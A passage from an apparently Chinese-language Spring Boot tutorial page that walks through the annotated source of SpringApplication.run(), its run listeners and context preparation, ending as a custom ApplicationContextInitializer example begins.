class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplication</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(String... args)</span> &#123;<br><span class="hljs-type">StopWatch</span> <span class="hljs-variable">stopWatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StopWatch</span>();<span class="hljs-comment">//开始计时器</span><br>stopWatch.start();<span class="hljs-comment">//开始计时</span><br>        <br>        <span class="hljs-comment">//1.</span><br>        <span class="hljs-comment">//创建引导上下文（Context环境）createBootstrapContext()</span><br>        <span class="hljs-comment">//获取到所有之前的 bootstrappers 挨个执行 intitialize() 来完成对引导启动器上下文环境设置</span><br><span class="hljs-type">DefaultBootstrapContext</span> <span class="hljs-variable">bootstrapContext</span> <span class="hljs-operator">=</span> createBootstrapContext();<br><br>        <span class="hljs-comment">//2.到最后该方法会返回这context</span><br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-comment">//3.让当前应用进入headless模式</span><br>        configureHeadlessProperty();<br>        <br>        <span class="hljs-comment">//4.获取所有 RunListener（运行监听器）,为了方便所有Listener进行事件感知</span><br><span class="hljs-type">SpringApplicationRunListeners</span> <span class="hljs-variable">listeners</span> <span class="hljs-operator">=</span> getRunListeners(args);<br><br>        <span class="hljs-comment">//5. 遍历 SpringApplicationRunListener 调用 starting 方法；</span><br><span class="hljs-comment">// 相当于通知所有感兴趣系统正在启动过程的人，项目正在 starting。</span><br>        listeners.starting(bootstrapContext, <span class="hljs-built_in">this</span>.mainApplicationClass);<br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//6.保存命令行参数 ApplicationArguments</span><br><span class="hljs-type">ApplicationArguments</span> <span class="hljs-variable">applicationArguments</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultApplicationArguments</span>(args);<br><br>            <span class="hljs-comment">//7.准备环境</span><br>            <span class="hljs-type">ConfigurableEnvironment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> prepareEnvironment(listeners, bootstrapContext, applicationArguments);<br>configureIgnoreBeanInfo(environment);<br><br>            <span class="hljs-comment">/*打印标志</span><br><span class="hljs-comment">              .   ____          _            __ _ _</span><br><span class="hljs-comment">             /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="hljs-comment">            ( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="hljs-comment">             \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="hljs-comment">              &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="hljs-comment">             =========|_|==============|___/=/_/_/_/</span><br><span class="hljs-comment">             :: Spring Boot ::                (v2.4.2)</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-type">Banner</span> <span class="hljs-variable">printedBanner</span> <span class="hljs-operator">=</span> printBanner(environment);<br>            <br>            <span class="hljs-comment">// 创建IOC容器（createApplicationContext（））</span><br><span class="hljs-comment">// 根据项目类型webApplicationType（NONE,SERVLET,REACTIVE）创建容器，</span><br><span class="hljs-comment">// 当前会创建 AnnotationConfigServletWebServerApplicationContext</span><br>context = createApplicationContext();<br>context.setApplicationStartup(<span class="hljs-built_in">this</span>.applicationStartup);<br>            <br>            <span class="hljs-comment">//8.准备ApplicationContext IOC容器的基本信息</span><br>prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);<br><span class="hljs-comment">//9.刷新IOC容器,创建容器中的所有组件,Spring框架的内容</span><br>            refreshContext(context);<br><span class="hljs-comment">//该方法没内容，大概为将来填入</span><br>afterRefresh(context, applicationArguments);<br>stopWatch.stop();<span class="hljs-comment">//停止计时</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logStartupInfo) &#123;<span class="hljs-comment">//this.logStartupInfo默认是true</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">StartupInfoLogger</span>(<span class="hljs-built_in">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);<br>&#125;<br>            <span class="hljs-comment">//10.</span><br>listeners.started(context);<br>            <br>            <span class="hljs-comment">//11.调用所有runners</span><br>callRunners(context, applicationArguments);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>            <span class="hljs-comment">//13.</span><br>handleRunFailure(context, ex, listeners);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(ex);<br>&#125;<br><br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//12.</span><br>listeners.running(context);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>            <span class="hljs-comment">//13.</span><br>handleRunFailure(context, ex, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(ex);<br>&#125;<br><span class="hljs-keyword">return</span> context;<br>&#125;<br> <br>    <span class="hljs-comment">//1. </span><br>    <span class="hljs-keyword">private</span> DefaultBootstrapContext <span class="hljs-title function_">createBootstrapContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">DefaultBootstrapContext</span> <span class="hljs-variable">bootstrapContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultBootstrapContext</span>();<br><span class="hljs-built_in">this</span>.bootstrappers.forEach((initializer) -&gt; initializer.intitialize(bootstrapContext));<br><span class="hljs-keyword">return</span> bootstrapContext;<br>&#125;<br>    <br>    <span class="hljs-comment">//3.</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureHeadlessProperty</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//this.headless默认为true</span><br>System.setProperty(SYSTEM_PROPERTY_JAVA_AWT_HEADLESS,<br>System.getProperty(SYSTEM_PROPERTY_JAVA_AWT_HEADLESS, Boolean.toString(<span class="hljs-built_in">this</span>.headless)));<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_PROPERTY_JAVA_AWT_HEADLESS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.awt.headless&quot;</span>;<br>    <br>    <span class="hljs-comment">//4.</span><br>    <span class="hljs-keyword">private</span> SpringApplicationRunListeners <span class="hljs-title function_">getRunListeners</span><span class="hljs-params">(String[] args)</span> &#123;<br>Class&lt;?&gt;[] types = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[] &#123; SpringApplication.class, String[].class &#125;;<br><span class="hljs-comment">//getSpringFactoriesInstances 去 spring.factories 找 SpringApplicationRunListener</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplicationRunListeners</span>(logger,<br>getSpringFactoriesInstances(SpringApplicationRunListener.class, types, <span class="hljs-built_in">this</span>, args),<br><span class="hljs-built_in">this</span>.applicationStartup);<br>&#125;<br>    <br>    <span class="hljs-comment">//7.准备环境</span><br>    <span class="hljs-keyword">private</span> ConfigurableEnvironment <span class="hljs-title function_">prepareEnvironment</span><span class="hljs-params">(SpringApplicationRunListeners listeners,</span><br><span class="hljs-params">DefaultBootstrapContext bootstrapContext, ApplicationArguments applicationArguments)</span> &#123;<br><span class="hljs-comment">// Create and configure the environment</span><br>        <span class="hljs-comment">//返回或者创建基础环境信息对象，如：StandardServletEnvironment, StandardReactiveWebEnvironment</span><br><span class="hljs-type">ConfigurableEnvironment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> getOrCreateEnvironment();<br>        <span class="hljs-comment">//配置环境信息对象,读取所有的配置源的配置属性值。</span><br>configureEnvironment(environment, applicationArguments.getSourceArgs());<br><span class="hljs-comment">//绑定环境信息</span><br>        ConfigurationPropertySources.attach(environment);<br>        <span class="hljs-comment">//7.1 通知所有的监听器当前环境准备完成</span><br>listeners.environmentPrepared(bootstrapContext, environment);<br>DefaultPropertiesPropertySource.moveToEnd(environment);<br>configureAdditionalProfiles(environment);<br>bindToSpringApplication(environment);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isCustomEnvironment) &#123;<br>environment = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnvironmentConverter</span>(getClassLoader()).convertEnvironmentIfNecessary(environment,<br>deduceEnvironmentClass());<br>&#125;<br>ConfigurationPropertySources.attach(environment);<br><span class="hljs-keyword">return</span> environment;<br>&#125;<br>    <br>    <span class="hljs-comment">//8.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">prepareContext</span><span class="hljs-params">(DefaultBootstrapContext bootstrapContext, ConfigurableApplicationContext context,</span><br><span class="hljs-params">ConfigurableEnvironment environment, SpringApplicationRunListeners listeners,</span><br><span class="hljs-params">ApplicationArguments applicationArguments, Banner printedBanner)</span> &#123;<br><span class="hljs-comment">//保存环境信息</span><br>        context.setEnvironment(environment);<br>        <span class="hljs-comment">//IOC容器的后置处理流程</span><br>postProcessApplicationContext(context);<br>        <span class="hljs-comment">//应用初始化器</span><br>applyInitializers(context);<br>        <span class="hljs-comment">//8.1 遍历所有的 listener 调用 contextPrepared。</span><br>        <span class="hljs-comment">//EventPublishRunListenr通知所有的监听器contextPrepared</span><br>listeners.contextPrepared(context);<br>bootstrapContext.close(context);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logStartupInfo) &#123;<br>logStartupInfo(context.getParent() == <span class="hljs-literal">null</span>);<br>logStartupProfileInfo(context);<br>&#125;<br><span class="hljs-comment">// Add boot specific singleton beans</span><br><span class="hljs-type">ConfigurableListableBeanFactory</span> <span class="hljs-variable">beanFactory</span> <span class="hljs-operator">=</span> context.getBeanFactory();<br>beanFactory.registerSingleton(<span class="hljs-string">&quot;springApplicationArguments&quot;</span>, applicationArguments);<br><span class="hljs-keyword">if</span> (printedBanner != <span class="hljs-literal">null</span>) &#123;<br>beanFactory.registerSingleton(<span class="hljs-string">&quot;springBootBanner&quot;</span>, printedBanner);<br>&#125;<br><span class="hljs-keyword">if</span> (beanFactory <span class="hljs-keyword">instanceof</span> DefaultListableBeanFactory) &#123;<br>((DefaultListableBeanFactory) beanFactory)<br>.setAllowBeanDefinitionOverriding(<span class="hljs-built_in">this</span>.allowBeanDefinitionOverriding);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.lazyInitialization) &#123;<br>context.addBeanFactoryPostProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyInitializationBeanFactoryPostProcessor</span>());<br>&#125;<br><span class="hljs-comment">// Load the sources</span><br>Set&lt;Object&gt; sources = getAllSources();<br>Assert.notEmpty(sources, <span class="hljs-string">&quot;Sources must not be empty&quot;</span>);<br>load(context, sources.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]));<br>        <span class="hljs-comment">//8.2</span><br>listeners.contextLoaded(context);<br>&#125;<br><br>    <span class="hljs-comment">//11.调用所有runners</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callRunners</span><span class="hljs-params">(ApplicationContext context, ApplicationArguments args)</span> &#123;<br>List&lt;Object&gt; runners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <br>        <span class="hljs-comment">//获取容器中的 ApplicationRunner</span><br>runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());<br><span class="hljs-comment">//获取容器中的  CommandLineRunner</span><br>        runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());<br>        <span class="hljs-comment">//合并所有runner并且按照@Order进行排序</span><br>AnnotationAwareOrderComparator.sort(runners);<br>        <span class="hljs-comment">//遍历所有的runner。调用 run 方法</span><br><span class="hljs-keyword">for</span> (Object runner : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;(runners)) &#123;<br><span class="hljs-keyword">if</span> (runner <span class="hljs-keyword">instanceof</span> ApplicationRunner) &#123;<br>callRunner((ApplicationRunner) runner, args);<br>&#125;<br><span class="hljs-keyword">if</span> (runner <span class="hljs-keyword">instanceof</span> CommandLineRunner) &#123;<br>callRunner((CommandLineRunner) runner, args);<br>&#125;<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-comment">//13.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRunFailure</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception,</span><br><span class="hljs-params">SpringApplicationRunListeners listeners)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>handleExitCode(context, exception);<br><span class="hljs-keyword">if</span> (listeners != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">//14.</span><br>listeners.failed(context, exception);<br>&#125;<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>reportFailure(getExceptionReporters(context), exception);<br><span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span>) &#123;<br>context.close();<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>logger.warn(<span class="hljs-string">&quot;Unable to close ApplicationContext&quot;</span>, ex);<br>&#125;<br>ReflectionUtils.rethrowRuntimeException(exception);<br>&#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2. new SpringApplication(primarySources).run(args) 最后返回的接口类型</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfigurableApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ApplicationContext</span>, Lifecycle, Closeable &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CONFIG_LOCATION_DELIMITERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;,; \t\n&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CONVERSION_SERVICE_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;conversionService&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">LOAD_TIME_WEAVER_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;loadTimeWeaver&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENVIRONMENT_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;environment&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_PROPERTIES_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;systemProperties&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_ENVIRONMENT_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;systemEnvironment&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">APPLICATION_STARTUP_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;applicationStartup&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SHUTDOWN_HOOK_THREAD_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SpringContextShutdownHook&quot;</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> ApplicationContext var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEnvironment</span><span class="hljs-params">(ConfigurableEnvironment var1)</span>;<br><br>    ConfigurableEnvironment <span class="hljs-title function_">getEnvironment</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationStartup</span><span class="hljs-params">(ApplicationStartup var1)</span>;<br><br>    ApplicationStartup <span class="hljs-title function_">getApplicationStartup</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addBeanFactoryPostProcessor</span><span class="hljs-params">(BeanFactoryPostProcessor var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationListener</span><span class="hljs-params">(ApplicationListener&lt;?&gt; var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassLoader</span><span class="hljs-params">(ClassLoader var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProtocolResolver</span><span class="hljs-params">(ProtocolResolver var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> BeansException, IllegalStateException;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerShutdownHook</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isActive</span><span class="hljs-params">()</span>;<br><br>    ConfigurableListableBeanFactory <span class="hljs-title function_">getBeanFactory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalStateException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#4.</span><br><span class="hljs-comment">#spring.factories</span><br><span class="hljs-comment"># Run Listeners</span><br><span class="hljs-attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.context.event.EventPublishingRunListener</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplicationRunListeners</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Log log;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;SpringApplicationRunListener&gt; listeners;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ApplicationStartup applicationStartup;<br><br>SpringApplicationRunListeners(Log log, Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SpringApplicationRunListener</span>&gt; listeners,<br>ApplicationStartup applicationStartup) &#123;<br><span class="hljs-built_in">this</span>.log = log;<br><span class="hljs-built_in">this</span>.listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(listeners);<br><span class="hljs-built_in">this</span>.applicationStartup = applicationStartup;<br>&#125;<br><br>    <span class="hljs-comment">//5.遍历 SpringApplicationRunListener 调用 starting 方法；</span><br><span class="hljs-comment">//相当于通知所有感兴趣系统正在启动过程的人，项目正在 starting。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">starting</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, Class&lt;?&gt; mainApplicationClass)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.starting&quot;</span>, (listener) -&gt; listener.starting(bootstrapContext),<br>(step) -&gt; &#123;<br><span class="hljs-keyword">if</span> (mainApplicationClass != <span class="hljs-literal">null</span>) &#123;<br>step.tag(<span class="hljs-string">&quot;mainApplicationClass&quot;</span>, mainApplicationClass.getName());<br>&#125;<br>&#125;);<br>&#125;<br>    <br>    <span class="hljs-comment">//7.1</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">environmentPrepared</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, ConfigurableEnvironment environment)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.environment-prepared&quot;</span>,<br>(listener) -&gt; listener.environmentPrepared(bootstrapContext, environment));<br>&#125;<br>    <br>    <span class="hljs-comment">//8.1</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextPrepared</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.context-prepared&quot;</span>, (listener) -&gt; listener.contextPrepared(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//8.2</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoaded</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.context-loaded&quot;</span>, (listener) -&gt; listener.contextLoaded(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//10.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">started</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.started&quot;</span>, (listener) -&gt; listener.started(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//12.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">running</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.running&quot;</span>, (listener) -&gt; listener.running(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//14.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.failed&quot;</span>,<br>(listener) -&gt; callFailedListener(listener, context, exception), (step) -&gt; &#123;<br>step.tag(<span class="hljs-string">&quot;exception&quot;</span>, exception.getClass().toString());<br>step.tag(<span class="hljs-string">&quot;message&quot;</span>, exception.getMessage());<br>&#125;);<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWithListeners</span><span class="hljs-params">(String stepName, Consumer&lt;SpringApplicationRunListener&gt; listenerAction,</span><br><span class="hljs-params">Consumer&lt;StartupStep&gt; stepAction)</span> &#123;<br><span class="hljs-type">StartupStep</span> <span class="hljs-variable">step</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.applicationStartup.start(stepName);<br><span class="hljs-built_in">this</span>.listeners.forEach(listenerAction);<br><span class="hljs-keyword">if</span> (stepAction != <span class="hljs-literal">null</span>) &#123;<br>stepAction.accept(step);<br>&#125;<br>step.end();<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="86、原理解析-自定义事件监听组件"><a href="#86、原理解析-自定义事件监听组件" class="headerlink" title="86、原理解析-自定义事件监听组件"></a>86、原理解析-自定义事件监听组件</h2><p><code>MyApplicationContextInitializer.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContextInitializer;<br><span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContextInitializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationContextInitializer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initialize</span><span class="hljs-params">(ConfigurableApplicationContext applicationContext)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationContextInitializer ....initialize.... &quot;</span>);<br>    